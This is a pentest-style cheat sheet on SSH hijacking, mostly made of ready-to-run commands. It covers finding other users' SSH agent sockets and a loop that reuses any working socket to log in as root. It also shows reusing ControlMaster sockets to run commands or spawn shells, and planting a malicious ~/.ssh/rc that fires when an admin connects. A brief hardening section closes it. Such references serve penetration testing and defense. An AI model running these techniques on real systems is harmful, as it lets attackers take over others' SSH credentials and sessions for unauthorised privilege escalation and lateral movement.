# 🐚 SSH Hijacking

## 📚 Resources

- [MITRE T1563.001](https://attack.mitre.org/techniques/T1563/001/)
- [SSH Agent Hijacking (DeepHacking)](https://blog.deephacking.tech/en/posts/ssh-agent-hijacking/)

## 🔑 Agent Socket Hijacking

If a socket is open via ssh agent and this agent has a misconfiguration, you can use it to get a session.

### Discovery

```bash
# Check running SSH processes
ps aux | grep ssh

# View agent details
ssh-agent
ssh-add -l # connect to socket store in envvar : SSH_AUTH_SOCK
```

```bash
# Find agent sockets
find /tmp /var/tmp /run/user /home -name "agent.*" -type s 2>/dev/null

# Check permissions
find /tmp -name "agent.*" -type s -exec ls -la {} \; 2>/dev/null
```

## Hijack loop (cron jobs)

```bash
while true; do
    for sock in /tmp/ssh-*/agent.*; do
        if [ -S "$sock" ] && [ "$sock" != "$SSH_AUTH_SOCK" ]; then
            if SSH_AUTH_SOCK="$sock" ssh-add -l 2>/dev/null; then
                export SSH_AUTH_SOCK="$sock"
                ssh root@localhost
            fi
        fi
    done
done
```

## Real-time monitoring

```bash
# Watch for new sockets
watch -n 1 'find /tmp -name "agent.*" -type s -ls 2>/dev/null'

# Inotify-based (more efficient)
inotifywait -m -r /tmp --format '%w%f' 2>/dev/null | grep ssh-
```

## 🔌 ControlMaster Hijacking

```bash
# Find ControlMaster sockets
find /tmp -name "master-*" -type s 2>/dev/null

# List active connections
ssh -O check -S /tmp/ssh-XXX/master-<hash> user@target

# Execute command via existing connection
ssh -S /tmp/ssh-XXX/master-<hash> user@target command

# Spawn shell
ssh -S /tmp/ssh-XXX/master-<hash> user@target -t /bin/bash
```

## 📄 .ssh/rc Vector

Triggered when admin connects to **YOUR** session, create a file named `~/.ssh/rc`.

```bash
# Malicious rc file
echo "ssh -oStrictHostKeyChecking=no root@localhost <COMMAND>" > ~/.ssh/rc
chmod +x ~/.ssh/rc
```

> **Requirement**: PermitUserRC yes (usually default)

## 🛡️ Hardening

::: code-group

```bash [Unix]
# Client: require confirmation
ssh-add -c

# Client: set key lifetime (seconds)
ssh-add -t 3600

# Disable agent forwarding for untrusted hosts
ssh -o ForwardAgent=no user@host

# Disable user RC files
ssh -o PermitUserRC=no user@host
```

```ini [/etc/ssh/sshd_config]
# /etc/ssh/sshd_config
PermitUserRC no
PermitUserEnvironment no
AllowAgentForwarding no
```

:::

## 🎯 Real Scenarios

- **Cron Jobs**: Scheduled tasks using SSH agent
- **CI/CD Systems**: Build servers with deployment keys
- **Bastion Hosts**: Shared jump servers
- **Developer Workstations**: Shared development environments
